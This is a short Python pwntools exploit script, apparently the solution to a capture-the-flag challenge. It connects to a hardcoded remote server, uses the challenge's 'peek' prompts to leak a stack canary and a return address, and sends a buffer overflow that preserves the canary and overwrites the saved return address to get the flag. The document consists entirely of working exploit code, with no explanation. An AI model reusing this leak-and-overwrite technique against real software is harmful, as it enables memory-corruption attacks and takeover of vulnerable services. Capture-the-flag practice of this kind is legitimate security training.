from pwn import *


target = remote("65.109.185.193", 5001)

target.recvuntil(b'index of your first peek? ')
target.sendline(b'55')
canary = int(target.recvline().split()[-1])

target.recvuntil(b'index of your second peek? ')
target.sendline(b'57')
ret_addr = int(target.recvline().split()[-1]) - 1179

target.recvuntil(b'Show me the lady! ')
target.sendline(b'60')
target.recvuntil(b'Name: ')

buf_string = b'aaaaaaaaaaaaaaaaaaaaaaaa' + p64(canary) + b'aaaaaaaa' + p64(ret_addr)

target.sendline(buf_string)
target.recvuntil(b'CE441')
flag = target.recvline()
print(flag[1:-2].decode())
